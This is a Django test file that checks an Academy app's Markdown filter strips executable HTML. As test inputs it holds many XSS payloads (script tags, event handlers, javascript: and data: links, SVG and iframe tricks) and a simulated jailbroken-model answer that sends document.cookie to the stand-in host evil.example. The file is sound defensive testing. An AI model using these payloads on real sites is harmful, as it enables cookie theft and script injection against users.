"""HOST-SEC-2: the shared `markdownify` filter must not emit executable HTML.

Python-Markdown passes raw HTML through, and `markdownify` used to mark the
result safe unsanitized. Documentation, tutorial text and LLM-generated
assistant answers all reach it, so every case below renders hostile *synthetic*
Markdown and inspects the parsed output, not just the filter's return type.

This guards browser-side HTML execution only. It does not protect a model from
prompt injection in retrieved content, which is a separate concern (S-35).
"""
from html.parser import HTMLParser
from pathlib import Path

from django.contrib.auth import get_user_model
from django.template import Context, Template
from django.test import SimpleTestCase, TestCase
from django.urls import reverse
from django.utils.safestring import SafeString

from academy.models import (
    DocumentationChatMessage,
    DocumentationChatSession,
    DocumentationChunk,
    DocumentationPage,
    DocumentationSource,
    TutorialMission,
    TutorialModule,
)
from academy.templatetags.markdownify import markdownify

User = get_user_model()

FORBIDDEN_TAGS = {
    "script", "style", "iframe", "frame", "object", "embed", "svg", "math",
    "form", "input", "button", "link", "meta", "base", "video", "audio",
    "source", "template", "details", "marquee",
}
URL_ATTRIBUTES = {"href", "src", "action", "formaction", "xlink:href", "srcset", "data"}


class _Collector(HTMLParser):
    """Records every element, with its attributes, the way a browser parses it."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.elements = []
        self.text = []
        self.script_text = []
        self._in_script = False

    def handle_starttag(self, tag, attrs):
        self.elements.append((tag, dict(attrs)))
        self._in_script = tag == "script"

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        (self.script_text if self._in_script else self.text).append(data)


def parse(html):
    collector = _Collector()
    collector.feed(str(html))
    collector.close()
    return collector


def tags(html):
    return [tag for tag, _ in parse(html).elements]


def find(html, tag):
    return [attrs for name, attrs in parse(html).elements if name == tag]


class ExecutableContentTests(SimpleTestCase):
    def assertNonExecutable(self, html):
        """No active element, no event handler, no scriptable URL survives."""
        parsed = parse(html)
        for tag, attrs in parsed.elements:
            self.assertNotIn(tag, FORBIDDEN_TAGS, f"active element <{tag}> survived")
            for name, value in attrs.items():
                self.assertFalse(name.startswith("on"), f"<{tag} {name}> survived")
                if name in URL_ATTRIBUTES and value:
                    scheme = value.strip().lower().replace("\t", "").replace("\n", "")
                    self.assertFalse(
                        scheme.startswith(("javascript:", "vbscript:", "data:")),
                        f"<{tag} {name}={value!r}> survived",
                    )

    def test_the_filter_still_returns_safe_markup(self):
        self.assertIsInstance(markdownify("**x**"), SafeString)
        self.assertEqual(markdownify(""), "")
        self.assertEqual(markdownify(None), "")

    def test_raw_script_elements_are_removed_with_their_content(self):
        for source in (
            "<script>alert(1)</script>",
            "text\n\n<script src='https://evil.example/x.js'></script>\n\nmore",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<style>body{display:none}</style>",
        ):
            with self.subTest(source=source):
                html = markdownify(source)
                self.assertNonExecutable(html)
                self.assertNotIn("alert(1)", html)
                self.assertNotIn("display:none", html)

    def test_event_handler_attributes_are_removed(self):
        for source in (
            "<img src=x onerror=alert(1)>",
            '<img src="/static/a.png" onload="alert(1)">',
            '<a href="/ok" onclick="alert(1)">link</a>',
            '<p onmouseover="alert(1)">hover</p>',
            '<div onclick="alert(1)">block</div>',
            "<h2 onfocus=alert(1) autofocus tabindex=0>h</h2>",
            "<details open ontoggle=alert(1)>x</details>",
        ):
            with self.subTest(source=source):
                self.assertNonExecutable(markdownify(source))

    def test_javascript_links_are_neutralized_in_every_encoding(self):
        for source in (
            "[x](javascript:alert(1))",
            "[x](JaVaScRiPt:alert(1))",
            "[x](&#106;avascript:alert(1))",
            "[x](&#x6A;avascript:alert(1))",
            "[x](java&#x09;script:alert(1))",
            "[x](  javascript:alert(1))",
            "[x](vbscript:msgbox(1))",
            "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
            '<a href="javascript:alert(1)">x</a>',
            '<a href="&#0000106avascript:alert(1)">x</a>',
            '<a href="jav&#x0A;ascript:alert(1)">x</a>',
            "<javascript:alert(1)>",
        ):
            with self.subTest(source=source):
                html = markdownify(source)
                self.assertNonExecutable(html)
                self.assertNotIn("javascript", html.lower().replace("&#", ""))

    def test_svg_math_and_embedded_active_content_are_removed(self):
        for source in (
            "<svg onload=alert(1)></svg>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
            "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
            '<iframe src="https://evil.example"></iframe>',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            '<object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '<form action="https://evil.example"><input name=x><button>go</button></form>',
            '<meta http-equiv="refresh" content="0;url=https://evil.example">',
            '<link rel="stylesheet" href="https://evil.example/x.css">',
            '<base href="https://evil.example/">',
        ):
            with self.subTest(source=source):
                self.assertNonExecutable(markdownify(source))

    def test_html_comments_and_cdata_do_not_smuggle_markup(self):
        html = markdownify("<!-- <script>alert(1)</script> -->\n\nok <![CDATA[<script>alert(1)</script>]]>")
        self.assertNonExecutable(html)
        self.assertNotIn("<!--", html)

    def test_inline_styles_are_not_allowed_outside_table_alignment(self):
        html = markdownify('<div style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>')
        self.assertNonExecutable(html)
        self.assertNotIn("style=", html)
        html = markdownify('| a |\n|:-:|\n| 1 |\n\n<td style="background:url(javascript:alert(1))">x</td>')
        self.assertNotIn("javascript", html)

    def test_remote_images_are_not_rendered(self):
        """A remote <img> lets untrusted text make the reader's browser call out."""
        for source in (
            "![x](https://evil.example/t.png?secret=1)",
            "![x](//evil.example/t.png)",
            '<img src="http://evil.example/t.png">',
            "![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
        ):
            with self.subTest(source=source):
                for attrs in find(markdownify(source), "img"):
                    self.assertNotIn("src", attrs)

    def test_dom_clobbering_ids_and_classes_are_not_accepted(self):
        html = markdownify(
            '<h2 id="messages Area" class="x">a</h2>\n\n'
            '<h2 id="x&quot; onclick=&quot;alert(1)">b</h2>\n\n'
            '<code class="language-x onclick">c</code>'
        )
        self.assertNonExecutable(html)
        for attrs in find(html, "h2"):
            self.assertNotIn("class", attrs)
            self.assertNotIn(" ", attrs.get("id", ""))
        for attrs in find(html, "code"):
            self.assertNotIn(" ", attrs.get("class", ""))

    def test_hostile_model_generated_answer_is_rendered_inert(self):
        """What an injected or jailbroken model could return as `final_answer`."""
        answer = (
            "## Setup\n\n"
            "Run `manage.py check` first.\n\n"
            "<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">\n\n"
            "[Click to continue](javascript:fetch('https://evil.example'))\n\n"
            "<script>document.location='https://evil.example'</script>\n\n"
            "**Done.**"
        )
        html = markdownify(answer)
        self.assertNonExecutable(html)
        for tag, attrs in parse(html).elements:
            for name in ("href", "src"):
                self.assertNotIn("evil.example", attrs.get(name, ""), f"<{tag} {name}>")
        self.assertNotIn("document.cookie", html)
        # The genuine formatting around the attack is preserved.
        self.assertIn('<h2 id="setup">Setup</h2>', html)
        self.assertIn("<code>manage.py check</code>", html)
        self.assertIn("<strong>Done.</strong>", html)


class LegitimateMarkdownTests(SimpleTestCase):
    def test_paragraphs_emphasis_and_headings(self):
        html = markdownify("# Title\n\n## Sub section\n\nPlain **bold** and *italic* text.")
        self.assertIn('<h1 id="title">Title</h1>', html)
        self.assertIn('<h2 id="sub-section">Sub section</h2>', html)
        self.assertIn("<p>Plain <strong>bold</strong> and <em>italic</em> text.</p>", html)

    def test_every_heading_level_keeps_its_anchor_id(self):
        html = markdownify("\n\n".join(f"{'#' * n} Level {n}" for n in range(1, 7)))
        for n in range(1, 7):
            self.assertEqual(find(html, f"h{n}"), [{"id": f"level-{n}"}])

    def test_lists_and_blockquotes(self):
        # Rendered separately: Python-Markdown merges adjacent lists of different
        # kinds, which is its own behavior and not the sanitizer's.
        bullets = tags(markdownify("- a\n- b\n"))
        self.assertEqual((bullets.count("ul"), bullets.count("li")), (1, 2))
        numbered = tags(markdownify("1. one\n2. two\n"))
        self.assertEqual((numbered.count("ol"), numbered.count("li")), (1, 2))
        self.assertEqual(tags(markdownify("> quoted\n")).count("blockquote"), 1)

    def test_tables_keep_their_structure_and_alignment(self):
        html = markdownify("| Name | Count |\n|:-----|------:|\n| a | 1 |\n| b | 2 |\n")
        for tag in ("table", "thead", "tbody", "tr", "th", "td"):
            self.assertIn(tag, tags(html))
        self.assertEqual(
            [attrs.get("style") for attrs in find(html, "th")],
            ["text-align: left;", "text-align: right;"],
        )
        self.assertEqual(tags(html).count("td"), 4)

    def test_inline_code_and_fenced_code_show_html_as_text(self):
        source = (
            "Use `<script>alert(1)</script>` carefully.\n\n"
            "```html\n<img src=x onerror=alert(1)>\n<a href=\"javascript:alert(1)\">x</a>\n```\n\n"
            "```\nno language <b>bold</b>\n```\n"
        )
        html = markdownify(source)
        parsed = parse(html)
        self.assertNotIn("script", [tag for tag, _ in parsed.elements])
        self.assertNotIn("img", [tag for tag, _ in parsed.elements])
        self.assertNotIn("b", [tag for tag, _ in parsed.elements])
        text = "".join(parsed.text)
        self.assertIn("<script>alert(1)</script>", text)
        self.assertIn("<img src=x onerror=alert(1)>", text)
        self.assertIn("no language <b>bold</b>", text)
        self.assertIn({"class": "language-html"}, find(html, "code"))

    def test_safe_external_relative_and_mail_links_keep_their_target(self):
        html = markdownify(
            "[ext](https://example.com/a?b=1) [plain](http://example.com) "
            "[rel](/docs/core-concepts/#provider) [frag](#section) [mail](mailto:team@example.com)"
        )
        hrefs = [attrs["href"] for attrs in find(html, "a")]
        self.assertEqual(
            hrefs,
            [
                "https://example.com/a?b=1",
                "http://example.com",
                "/docs/core-concepts/#provider",
                "#section",
                "mailto:team@example.com",
            ],
        )
        for attrs in find(html, "a"):
            self.assertEqual(attrs["rel"], "noopener noreferrer")

    def test_local_images_used_by_the_tutorials_survive(self):
        html = markdownify('![Add form](/static/academy/img/tutorials/knowledge-form.png "The form")')
        self.assertEqual(
            find(html, "img"),
            [{
                "alt": "Add form",
                "src": "/static/academy/img/tutorials/knowledge-form.png",
                "title": "The form",
            }],
        )

    def test_angle_bracket_placeholders_in_code_stay_visible(self):
        html = markdownify("Run `python manage.py seed --scope <slug|id>` now.\n\n```text\n<module>/<mission>\n```")
        text = "".join(parse(html).text)
        self.assertIn("<slug|id>", text)
        self.assertIn("<module>/<mission>", text)

    def test_filter_is_stable_across_repeated_calls(self):
        """The module-level Markdown instance is reused; heading ids must not drift."""
        first = markdownify("# Same\n\n# Same")
        second = markdownify("# Same\n\n# Same")
        self.assertEqual(first, second)


class ExistingContentIsUnchangedTests(SimpleTestCase):
    """The allow-list must not silently strip formatting Academy relies on."""

    def test_documentation_structure_is_identical_before_and_after_sanitizing(self):
        from collections import Counter

        from academy.templatetags import markdownify as module
        from django.conf import settings

        def structure(html):
            elements = Counter()
            for tag, attrs in parse(html).elements:
                kept = tuple(
                    sorted(
                        (name, value) for name, value in attrs.items()
                        if not (tag == "a" and name == "rel")  # added on purpose
                    )
                )
                elements[(tag, kept)] += 1
            return elements

        files = sorted(Path(settings.AIHUB_DOCS_SOURCE).glob("*.md")) + sorted(
            Path(settings.ACADEMY_DOCS_SOURCE).glob("*.md")
        )
        self.assertGreater(len(files), 10)
        for path in files:
            with self.subTest(document=path.name):
                text = path.read_text(encoding="utf-8")
                module._md.reset()
                unsanitized = module._md.convert(text)
                self.assertEqual(
                    structure(unsanitized), structure(markdownify(text)),
                    f"{path.name}: sanitizing changed rendered structure",
                )


class RenderedTemplateTests(TestCase):
    """The same hostile Markdown, rendered through the real Academy pages."""

    HOSTILE = (
        "Hello\n\n"
        "<script>window.__pwned = 1</script>\n\n"
        "<img src=x onerror=\"window.__pwned = 2\">\n\n"
        "[bad](javascript:window.__pwned=3)\n\n"
        "<svg onload=window.__pwned=4></svg>\n\n"
        "[good](https://example.com/ok)\n"
    )

    def assertPageIsInert(self, response):
        self.assertEqual(response.status_code, 200)
        parsed = parse(response.content.decode())
        # The pages' own scripts legitimately exist, so only the hostile marker
        # is followed: it must not reach any attribute (event handler or URL) or
        # any script body. Escaped, visible text is inert and is not an error.
        for tag, attrs in parsed.elements:
            for name, value in attrs.items():
                self.assertNotIn("__pwned", value or "", f"<{tag} {name}>")
        self.assertNotIn("__pwned", "".join(parsed.script_text))
        self.assertIn("https://example.com/ok", [a.get("href") for t, a in parsed.elements if t == "a"])

    def test_documentation_assistant_message(self):
        user = User.objects.create_user("render-user", password="pw")
        session = DocumentationChatSession.objects.create(user=user, title="t")
        DocumentationChatMessage.objects.create(
            session=session, role=DocumentationChatMessage.Role.ASSISTANT, content=self.HOSTILE
        )
        self.client.force_login(user)
        response = self.client.get(reverse("academy:assistant"))
        self.assertPageIsInert(response)

    def test_documentation_detail_page_and_chunks(self):
        source = DocumentationSource.objects.create(name="Docs", slug="docs")
        page = DocumentationPage.objects.create(
            source=source, title="Page", slug="page", source_path="p.md",
            body_markdown=self.HOSTILE, order=1,
        )
        DocumentationChunk.objects.create(
            page=page, heading="Chunk", anchor="chunk", body_markdown=self.HOSTILE, order=1,
            search_text="hello",
        )
        self.assertPageIsInert(self.client.get(reverse("academy:docs_detail", args=["page"])))

    def test_documentation_search_results(self):
        source = DocumentationSource.objects.create(name="Docs", slug="docs")
        page = DocumentationPage.objects.create(
            source=source, title="Page", slug="page", source_path="p.md",
            body_markdown="Hello", order=1,
        )
        DocumentationChunk.objects.create(
            page=page, heading="Hello", anchor="hello", body_markdown=self.HOSTILE, order=1,
            search_text="hello world",
        )
        self.assertPageIsInert(self.client.get(reverse("academy:docs_search") + "?q=hello"))

    def test_tutorial_mission_instructions(self):
        module = TutorialModule.objects.create(title="M", slug="m", order=1)
        TutorialMission.objects.create(
            module=module, title="Mission", slug="mission", order=1, goal="g",
            instructions_markdown=self.HOSTILE, validation_key="visited_control_room",
        )
        self.assertPageIsInert(
            self.client.get(reverse("academy:tutorial_mission", args=["m", "mission"]))
        )

    def test_filter_in_a_template_is_not_double_escaped(self):
        rendered = Template("{% load markdownify %}{{ text|markdownify }}").render(
            Context({"text": "**bold** & `a < b`"})
        )
        self.assertIn("<strong>bold</strong>", rendered)
        self.assertIn("<code>a &lt; b</code>", rendered)
